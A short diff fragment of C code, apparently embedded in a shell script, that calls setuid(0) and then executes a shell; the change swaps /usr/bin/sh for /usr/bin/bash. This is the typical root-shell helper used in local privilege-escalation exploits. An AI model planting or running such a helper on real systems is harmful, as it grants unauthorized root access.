@@ -25,7 +25,7 @@ fi
   // The last NULL in argv is copied to shargv
   char *shenv[] = {NULL};
   setuid(0);
-  execve("/usr/bin/sh", shargv, shenv);
+  execve("/usr/bin/bash", shargv, shenv);
   perror("could not execve");
   return 1;
 }
